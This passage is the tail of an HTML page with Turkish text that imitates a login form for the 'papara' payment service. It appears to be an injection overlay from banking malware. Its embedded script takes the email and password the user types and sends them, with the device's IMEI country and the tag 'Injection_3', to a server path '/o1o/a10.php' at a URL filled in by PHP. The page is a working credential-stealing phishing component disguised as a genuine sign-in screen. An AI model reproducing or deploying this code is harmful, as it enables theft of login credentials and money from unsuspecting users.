Jggg==">
</div>

<div class="text">
	<h4>Ya da</h4>
</div>

	<form method="post">

		<input type="email" id="login" name="fields[login]" class="l-field" placeholder="E-posta Adresiniz">

		<input type="password" id="password" name="fields[password]" class="p-field" placeholder="Şifreniz">

		<input type="submit" class="button" id="submitBtn1" value="GİRİŞ YAP">

	</form>
</body>

</form><iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    <script type="text/javascript">

    (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'l-field';
                            oCodeInp.className = 'p-field';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'l-field error';
							} catch(e){};
                            return false;
                        }

                        if (oCodeInp.value.length < 3) {
							try{
                                oCodeInp.className = 'p-field error';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|papara|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>
</html>
